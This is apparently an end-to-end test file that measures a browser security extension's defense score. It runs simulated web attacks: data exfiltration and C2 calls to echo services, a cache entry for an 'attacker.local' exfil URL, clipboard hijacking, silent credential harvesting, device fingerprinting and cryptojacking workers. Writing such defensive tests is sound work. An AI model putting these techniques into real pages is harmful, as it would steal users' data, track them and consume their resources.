/**
 * Defense Score E2E Test
 *
 * Measures the Audit extension's defense score by running Battacker attack
 * simulations in MAIN world via page.evaluate(). This is necessary because
 * the Battacker extension's content script runs in ISOLATED world and cannot
 * be intercepted by our MAIN world hooks (api-hooks.js).
 *
 * Each attack is serialized as inline code and executed in the page context
 * where the Audit extension's hooks are active.
 */

import { test, expect } from "@playwright/test";
import { chromium, type BrowserContext, type Page } from "playwright";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { existsSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { readFileSync } from "node:fs";

const __dirname = dirname(fileURLToPath(import.meta.url));

const AUDIT_EXTENSION_PATH = resolve(__dirname, "../../audit-extension/dist/chrome-mv3");
const TEST_PAGE_PATH = resolve(__dirname, "../fixtures/test-page.html");
const DEFENSE_REPORT_PATH = resolve(__dirname, "../defense-score-report.json");

import {
  type AttackCategory,
  type Severity,
  type Grade,
  CATEGORY_WEIGHTS,
  CATEGORY_LABELS,
  scoreToGrade,
  SEVERITY_SCORES,
} from "@libztbs/battacker";

// ============================================================================
// E2E Test Types
// ============================================================================

interface AttackResult {
  blocked: boolean;
  executionTime: number;
  details: string;
  partial?: boolean;
  error?: string;
}

interface AttackDef {
  id: string;
  name: string;
  category: AttackCategory;
  description: string;
  severity: Severity;
  /** Inline function body to be serialized into page.evaluate() */
  simulate: (page: Page) => Promise<AttackResult>;
}

interface CategoryScore {
  category: AttackCategory;
  score: number;
  maxScore: number;
  blocked: number;
  total: number;
}

// ============================================================================
// Attack Definitions (inline simulators for page.evaluate)
// ============================================================================

const attacks: AttackDef[] = [
  // --- Network ---
  {
    id: "network-beacon",
    name: "Tracking Beacon",
    category: "network",
    description: "Sends a tracking beacon to an external server with user info",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/post", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ type: "tracking_beacon", timestamp: Date.now(), userAgent: navigator.userAgent }),
          });
          return { blocked: false, executionTime: performance.now() - startTime, details: `Beacon sent (status: ${response.status})` };
        } catch (error: any) {
          const msg = error?.message ?? String(error);
          return { blocked: msg.includes("blocked") || msg.includes("ERR_BLOCKED"), executionTime: performance.now() - startTime, details: `Request failed: ${msg}` };
        }
      }),
  },
  {
    id: "network-exfiltration",
    name: "Data Exfiltration",
    category: "network",
    description: "Attempts to send sensitive data (PII) to an external server",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/post", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: "test@example.com", creditCard: "4111-1111-1111-1111", ssn: "123-45-6789", password: "password123" }),
          });
          return { blocked: false, executionTime: performance.now() - startTime, details: `Exfiltration simulated (status: ${response.status})` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "network-c2",
    name: "C2 Communication",
    category: "network",
    description: "Simulates command-and-control server polling",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://jsonplaceholder.typicode.com/posts/1");
          const data = await response.json();
          return { blocked: false, executionTime: performance.now() - startTime, details: `C2 polling successful, received ${JSON.stringify(data).length} bytes` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `C2 blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "network-websocket-c2",
    name: "WebSocket C2 Communication",
    category: "network",
    description: "Establishes WebSocket connection for C2 communication",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          try {
            const ws = new WebSocket("wss://echo.websocket.org/");
            let resolved = false;
            const timeout = setTimeout(() => {
              if (!resolved) { resolved = true; ws.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebSocket connection timed out" }); }
            }, 5000);
            ws.onopen = () => { ws.send(JSON.stringify({ type: "c2_checkin", timestamp: Date.now() })); };
            ws.onmessage = (event) => { if (!resolved) { resolved = true; clearTimeout(timeout); ws.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `WebSocket C2 successful: ${event.data.length} bytes` }); } };
            ws.onerror = () => { if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "WebSocket connection blocked" }); } };
          } catch (error: any) {
            resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebSocket blocked: ${error?.message}` });
          }
        });
      }),
  },
  {
    id: "network-webworker-exfil",
    name: "Web Worker Exfiltration",
    category: "network",
    description: "Uses Web Worker to exfiltrate data (bypasses main thread monitoring)",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const workerCode = `self.onmessage = async (e) => { try { const r = await fetch('https://httpbin.org/post', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({exfil: e.data}) }); self.postMessage({success:true, status:r.status}); } catch(err) { self.postMessage({success:false, error:err.message}); } };`;
          const blob = new Blob([workerCode], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker exfiltration timed out" }); }, 5000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: !e.data.success, executionTime: performance.now() - startTime, details: e.data.success ? `Worker exfil successful (status: ${e.data.status})` : `Worker fetch blocked: ${e.data.error}` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker creation blocked: ${err.message}` }); };
            worker.postMessage({ sensitiveData: "stolen-credentials", timestamp: Date.now() });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker exfil blocked: ${error?.message}` };
        }
      }),
  },

  // --- Phishing ---
  {
    id: "phishing-clipboard",
    name: "Clipboard Hijacking",
    category: "phishing",
    description: "Attempts to replace clipboard content with malicious data",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          await navigator.clipboard.writeText("malicious-crypto-address-1234567890");
          return { blocked: false, executionTime: performance.now() - startTime, details: "Clipboard hijack successful" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Clipboard hijack blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "phishing-credential-api",
    name: "Credential API Harvest",
    category: "phishing",
    description: "Attempts to silently harvest stored credentials",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("credentials" in navigator)) return { blocked: false, executionTime: performance.now() - startTime, details: "Credential Management API not available" };
          const credential = await navigator.credentials.get({ password: true, mediation: "silent" } as CredentialRequestOptions);
          return { blocked: false, executionTime: performance.now() - startTime, details: credential ? `Credential harvest: ${credential.type}` : "No stored credentials found" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Credential harvest blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "phishing-notification",
    name: "Notification Phishing",
    category: "phishing",
    description: "Displays fake security notification to lure user",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("Notification" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "Notification API not available" };
          const permission = await Notification.requestPermission();
          if (permission === "denied") return { blocked: true, executionTime: performance.now() - startTime, details: "Notification permission denied" };
          return { blocked: false, executionTime: performance.now() - startTime, details: `Notification permission: ${permission}` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Notification blocked: ${error?.message}` };
        }
      }),
  },

  // --- Client-Side ---
  {
    id: "client-xss",
    name: "XSS Payload Injection",
    category: "client-side",
    description: "Attempts to inject and execute script in the current page",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const el = document.createElement("div");
          el.id = "battacker-xss-test";
          el.style.display = "none";
          document.body.appendChild(el);
          const injected = document.getElementById("battacker-xss-test");
          document.body.removeChild(el);
          return { blocked: !injected, executionTime: performance.now() - startTime, details: injected ? "XSS-like injection successful" : "XSS injection blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Script injection blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "client-dom",
    name: "DOM Manipulation",
    category: "client-side",
    description: "Attempts to access and manipulate page DOM elements",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const forms = document.querySelectorAll("form");
          const inputs = document.querySelectorAll("input");
          return { blocked: false, executionTime: performance.now() - startTime, details: `DOM access: ${forms.length} forms, ${inputs.length} inputs` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `DOM blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "client-cookie",
    name: "Cookie Theft",
    category: "client-side",
    description: "Attempts to read cookies from the current page",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const cookies = document.cookie;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Cookie access: ${cookies.length} chars` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Cookie access blocked: ${error?.message}` };
        }
      }),
  },

  // --- Download ---
  {
    id: "download-blob",
    name: "Blob URL Download",
    category: "download",
    description: "Attempts to download a dynamically generated malicious file via Blob URL",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const blob = new Blob(["malicious"], { type: "application/octet-stream" });
          const url = URL.createObjectURL(blob);
          const link = document.createElement("a");
          link.href = url;
          link.download = "test-payload.sh";
          URL.revokeObjectURL(url);
          return { blocked: false, executionTime: performance.now() - startTime, details: "Blob URL download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Blob download blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "download-dataurl",
    name: "Data URL Download",
    category: "download",
    description: "Attempts to download a Base64-encoded payload via Data URL",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const link = document.createElement("a");
          link.href = `data:application/octet-stream;base64,${btoa("malicious payload")}`;
          link.download = "test-data-payload.txt";
          return { blocked: false, executionTime: performance.now() - startTime, details: "Data URL download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Data URL download blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "download-suspicious",
    name: "Suspicious File Download",
    category: "download",
    description: "Attempts to trigger download of a suspicious executable file",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const link = document.createElement("a");
          link.href = "data:text/plain;base64,dGVzdA==";
          link.download = "suspicious-file.exe";
          return { blocked: false, executionTime: performance.now() - startTime, details: "Suspicious file download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Suspicious download blocked: ${error?.message}` };
        }
      }),
  },

  // --- Persistence ---
  {
    id: "persistence-indexeddb",
    name: "IndexedDB Data Stash",
    category: "persistence",
    description: "Stores sensitive data in IndexedDB for later exfiltration",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          try {
            const req = indexedDB.open("battacker_stash_test", 1);
            req.onerror = () => resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB access blocked" });
            req.onupgradeneeded = (e: any) => { const db = e.target.result; if (!db.objectStoreNames.contains("data")) db.createObjectStore("data", { keyPath: "id" }); };
            req.onsuccess = (e: any) => {
              const db = e.target.result;
              try {
                const tx = db.transaction(["data"], "readwrite");
                const store = tx.objectStore("data");
                store.add({ id: Date.now(), email: "victim@example.com", password: "hashed" });
                tx.oncomplete = () => { db.close(); indexedDB.deleteDatabase("battacker_stash_test"); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "IndexedDB data stash successful" }); };
                tx.onerror = () => { db.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB write blocked" }); };
              } catch { db.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB operation blocked" }); }
            };
          } catch (error: any) {
            resolve({ blocked: true, executionTime: performance.now() - startTime, details: `IndexedDB blocked: ${error?.message}` });
          }
        });
      }),
  },
  {
    id: "persistence-cache-api",
    name: "Cache API Abuse",
    category: "persistence",
    description: "Abuses Cache Storage API to persist exfiltration data",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("caches" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "Cache API not available" };
          const cache = await caches.open("battacker-exfil-cache");
          await cache.put("https://attacker.local/exfil.json", new Response(JSON.stringify({ data: "stolen" })));
          const cached = await cache.match("https://attacker.local/exfil.json");
          await caches.delete("battacker-exfil-cache");
          return { blocked: !cached, executionTime: performance.now() - startTime, details: cached ? "Cache API abuse successful" : "Cache API retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Cache API blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "persistence-history",
    name: "History State Exfil",
    category: "persistence",
    description: "Hides sensitive data in browser history state",
    severity: "low",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const orig = history.state;
          history.replaceState({ type: "history_exfil", credentials: "username:password" }, "", location.href);
          const retrieved = history.state;
          history.replaceState(orig, "", location.href);
          return { blocked: !(retrieved?.type === "history_exfil"), executionTime: performance.now() - startTime, details: retrieved?.type === "history_exfil" ? "History state exfil successful" : "History state blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `History state blocked: ${error?.message}` };
        }
      }),
  },

  // --- Side-Channel ---
  {
    id: "side-channel-canvas",
    name: "Canvas Fingerprinting",
    category: "side-channel",
    description: "Generates browser fingerprint via Canvas API rendering differences",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const canvas = document.createElement("canvas");
          canvas.width = 200; canvas.height = 50;
          const ctx = canvas.getContext("2d");
          if (!ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas 2D context not available" };
          ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
          ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069"; ctx.fillText("BrowserFingerprint", 2, 15);
          const dataUrl = canvas.toDataURL();
          if (dataUrl && dataUrl.length > 100) return { blocked: false, executionTime: performance.now() - startTime, details: `Canvas fingerprint: ${dataUrl.slice(-50)}` };
          return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas fingerprinting returned empty data" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Canvas blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-timing",
    name: "Performance Timing Attack",
    category: "side-channel",
    description: "Extracts sensitive timing information via Performance API",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const data: Record<string, any> = {};
          const entries = performance.getEntriesByType("navigation");
          if (entries.length > 0) { const nav = entries[0] as PerformanceNavigationTiming; data.duration = nav.duration; data.transferSize = nav.transferSize; }
          const res = performance.getEntriesByType("resource").slice(0, 5);
          data.resourceCount = res.length;
          const perf = performance as any;
          if (perf.memory) { data.usedHeap = perf.memory.usedJSHeapSize; }
          const fields = Object.keys(data).length;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Performance timing: ${fields} metrics collected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Performance timing blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-broadcast",
    name: "BroadcastChannel Leak",
    category: "side-channel",
    description: "Leaks data between browser tabs via BroadcastChannel API",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          if (!("BroadcastChannel" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "BroadcastChannel not available" };
          const sender = new BroadcastChannel("battacker_exfil");
          const receiver = new BroadcastChannel("battacker_exfil");
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { sender.close(); receiver.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "BroadcastChannel timed out or blocked" }); }, 2000);
            receiver.onmessage = (event) => { clearTimeout(timeout); sender.close(); receiver.close(); resolve({ blocked: !(event.data?.type === "exfil"), executionTime: performance.now() - startTime, details: event.data?.type === "exfil" ? "BroadcastChannel leak successful" : "BroadcastChannel data corrupted" }); };
            sender.postMessage({ type: "exfil", payload: { credentials: "stolen", sessionId: "abc123" } });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `BroadcastChannel blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-spectre-mitigation",
    name: "Spectre Timing Mitigation Check",
    category: "side-channel",
    description: "Verifies browser Spectre mitigations (timer precision reduction)",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const measurements: number[] = [];
        for (let i = 0; i < 100; i++) { const t1 = performance.now(); const t2 = performance.now(); measurements.push(t2 - t1); }
        const nonZero = measurements.filter((m) => m > 0);
        const minRes = nonZero.length > 0 ? Math.min(...nonZero) : 0;
        if (minRes >= 0.1) return { blocked: true, executionTime: performance.now() - startTime, details: `Spectre mitigation active - resolution ${minRes.toFixed(3)}ms` };
        if (minRes >= 0.005) return { blocked: false, executionTime: performance.now() - startTime, details: `Spectre partially mitigated - resolution ${minRes.toFixed(3)}ms` };
        return { blocked: false, executionTime: performance.now() - startTime, details: `High-precision timer available - resolution ${minRes.toFixed(6)}ms` };
      }),
  },
  {
    id: "side-channel-sharedarraybuffer",
    name: "SharedArrayBuffer Isolation Check",
    category: "side-channel",
    description: "Checks Cross-Origin Isolation status for SharedArrayBuffer",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (typeof SharedArrayBuffer === "undefined") return { blocked: true, executionTime: performance.now() - startTime, details: "SharedArrayBuffer disabled - Cross-Origin Isolation not enabled" };
        const crossOriginIsolated = (self as any).crossOriginIsolated ?? false;
        if (crossOriginIsolated) return { blocked: true, executionTime: performance.now() - startTime, details: "SharedArrayBuffer with Cross-Origin Isolation (COOP/COEP)" };
        return { blocked: false, executionTime: performance.now() - startTime, details: "SharedArrayBuffer available without Cross-Origin Isolation" };
      }),
  },

  // --- Fingerprinting ---
  {
    id: "fingerprint-webgl",
    name: "WebGL Fingerprinting",
    category: "fingerprinting",
    description: "Extracts GPU and WebGL renderer information for device identification",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (!gl) return { blocked: true, executionTime: performance.now() - startTime, details: "WebGL context not available" };
          const webgl = gl as WebGLRenderingContext;
          const fp: Record<string, string | null> = {};
          fp.vendor = webgl.getParameter(webgl.VENDOR);
          fp.renderer = webgl.getParameter(webgl.RENDERER);
          fp.version = webgl.getParameter(webgl.VERSION);
          fp.shadingLang = webgl.getParameter(webgl.SHADING_LANGUAGE_VERSION);
          const dbg = webgl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) { fp.unmaskedVendor = webgl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); fp.unmaskedRenderer = webgl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }
          const fields = Object.values(fp).filter(Boolean).length;
          return { blocked: fields < 4, executionTime: performance.now() - startTime, details: fields >= 4 ? `WebGL fingerprint: ${fields} params (GPU: ${fp.unmaskedRenderer || fp.renderer})` : `WebGL partially blocked: ${fields} params` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WebGL blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-audio",
    name: "Audio Fingerprinting",
    category: "fingerprinting",
    description: "Generates unique audio processing signature via AudioContext API",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const Ctx = window.AudioContext || (window as any).webkitAudioContext;
          if (!Ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "AudioContext not available" };
          const ac = new Ctx();
          const osc = ac.createOscillator();
          const analyser = ac.createAnalyser();
          const gain = ac.createGain();
          const comp = ac.createDynamicsCompressor();
          comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
          osc.type = "triangle"; osc.frequency.value = 10000;
          gain.gain.value = 0;
          osc.connect(comp); comp.connect(analyser); analyser.connect(gain); gain.connect(ac.destination);
          osc.start(0);
          await new Promise((r) => setTimeout(r, 100));
          const data = new Float32Array(analyser.frequencyBinCount);
          analyser.getFloatFrequencyData(data);
          let hash = 0;
          for (let i = 0; i < data.length; i++) { if (Number.isFinite(data[i])) { hash = (hash << 5) - hash + Math.round(data[i] * 1000); hash = hash | 0; } }
          osc.stop(); ac.close();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Audio fingerprint hash: ${hash.toString(16)}` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Audio blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-font",
    name: "Font Fingerprinting",
    category: "fingerprinting",
    description: "Detects installed fonts via canvas text measurement",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const testFonts = ["Arial", "Helvetica", "Times New Roman", "Georgia", "Verdana", "Courier New", "Comic Sans MS", "Impact", "Trebuchet MS", "Tahoma"];
          const baseFonts = ["monospace", "sans-serif", "serif"];
          const testStr = "mmmmmmmmmmlli1WWWWWWWWWWwwwwwwwwww0123456789";
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          if (!ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas context not available" };
          const getWidth = (f: string) => { ctx.font = `72px ${f}`; return ctx.measureText(testStr).width; };
          const baseWidths = baseFonts.map(getWidth);
          const detected: string[] = [];
          for (const font of testFonts) { for (let i = 0; i < baseFonts.length; i++) { if (getWidth(`'${font}', ${baseFonts[i]}`) !== baseWidths[i]) { detected.push(font); break; } } }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Font fingerprint: ${detected.length}/${testFonts.length} fonts detected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Font fingerprint blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-screen",
    name: "Screen Fingerprinting",
    category: "fingerprinting",
    description: "Collects screen resolution, DPI, and display properties",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const fp = { screenWidth: screen.width, screenHeight: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio, innerWidth: window.innerWidth, innerHeight: window.innerHeight };
          return { blocked: false, executionTime: performance.now() - startTime, details: `Screen fingerprint: ${fp.screenWidth}x${fp.screenHeight} @ ${fp.pixelRatio}x` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Screen fingerprint blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-navigator",
    name: "Navigator Fingerprinting",
    category: "fingerprinting",
    description: "Extracts browser and device information from navigator object",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const fp: Record<string, any> = { userAgent: navigator.userAgent, language: navigator.language, platform: navigator.platform, cookieEnabled: navigator.cookieEnabled, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints };
          const fields = Object.values(fp).filter((v) => v !== undefined).length;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Navigator fingerprint: ${fields} properties collected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Navigator fingerprint blocked: ${error?.message}` };
        }
      }),
  },

  // --- Cryptojacking ---
  {
    id: "cryptojacking-cpu",
    name: "CPU Mining Simulation",
    category: "cryptojacking",
    description: "Simulates cryptocurrency mining using main thread CPU resources",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        let hashCount = 0;
        const duration = 200;
        const simpleHash = (d: string) => { let h = 0; for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h = h | 0; } return Math.abs(h).toString(16).padStart(8, "0"); };
        const mineStart = performance.now();
        let nonce = 0;
        while (performance.now() - mineStart < duration) { simpleHash(`block:${Date.now()}:nonce:${nonce}`); hashCount++; nonce++; }
        const hashRate = Math.round((hashCount / duration) * 1000);
        return { blocked: false, executionTime: performance.now() - startTime, details: `CPU mining: ${hashRate} h/s (${hashCount} hashes)` };
      }),
  },
  {
    id: "cryptojacking-worker",
    name: "Web Worker Mining",
    category: "cryptojacking",
    description: "Uses Web Worker for background mining",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const code = `let running=true;function h(d){let hash=0;for(let i=0;i<d.length;i++){hash=((hash<<5)-hash)+d.charCodeAt(i);hash=hash|0;}return Math.abs(hash).toString(16);}self.onmessage=function(e){let c=0;const s=Date.now();while(Date.now()-s<e.data.duration&&running){h('block:'+Date.now()+':'+c);c++;}self.postMessage({hashCount:c,hashRate:Math.round(c/e.data.duration*1000)});};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker mining timed out" }); }, 3000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Worker mining: ${e.data.hashRate} h/s` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker mining blocked: ${err.message}` }); };
            worker.postMessage({ duration: 200 });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker mining blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "cryptojacking-multi-worker",
    name: "Multi-Worker Mining Pool",
    category: "cryptojacking",
    description: "Spawns multiple Web Workers to maximize mining throughput",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const workerCount = Math.min(navigator.hardwareConcurrency || 4, 4);
          const code = `function h(d){let hash=0;for(let i=0;i<d.length;i++){hash=((hash<<5)-hash)+d.charCodeAt(i);hash=hash|0;}return Math.abs(hash).toString(16);}self.onmessage=function(e){let c=0;const s=Date.now();while(Date.now()-s<e.data.duration){h('block:'+Date.now()+':'+e.data.id+':'+c);c++;}self.postMessage({hashCount:c,hashRate:Math.round(c/e.data.duration*1000)});};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const workers: Worker[] = [];
          for (let i = 0; i < workerCount; i++) workers.push(new Worker(url));
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const results: any[] = [];
            const timeout = setTimeout(() => { workers.forEach((w) => w.terminate()); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Multi-worker mining timed out (spawned ${workerCount})` }); }, 3000);
            workers.forEach((w, i) => {
              w.onmessage = (e) => { results.push(e.data); if (results.length === workerCount) { clearTimeout(timeout); workers.forEach((w2) => w2.terminate()); URL.revokeObjectURL(url); const totalRate = results.reduce((s, r) => s + r.hashRate, 0); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Multi-worker mining: ${workerCount} workers, ${totalRate} h/s combined` }); } };
              w.onerror = () => { clearTimeout(timeout); workers.forEach((w2) => w2.terminate()); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "Multi-worker mining blocked" }); };
              w.postMessage({ duration: 200, id: i });
            });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Multi-worker mining blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "cryptojacking-wasm",
    name: "WASM Mining Capability",
    category: "cryptojacking",
    description: "Tests WebAssembly execution capability for high-performance mining",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof WebAssembly === "undefined") return { blocked: true, executionTime: performance.now() - startTime, details: "WebAssembly not supported" };
          const wasmBinary = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7f,0x7f,0x01,0x7f,0x03,0x02,0x01,0x00,0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,0x0a,0x09,0x01,0x07,0x00,0x20,0x00,0x20,0x01,0x6a,0x0b]);
          const module = await WebAssembly.compile(wasmBinary);
          const instance = await WebAssembly.instantiate(module);
          const add = instance.exports.add as (a: number, b: number) => number;
          let count = 0;
          const s = performance.now();
          while (performance.now() - s < 100) { for (let i = 0; i < 1000; i++) { add(count, i); count++; } }
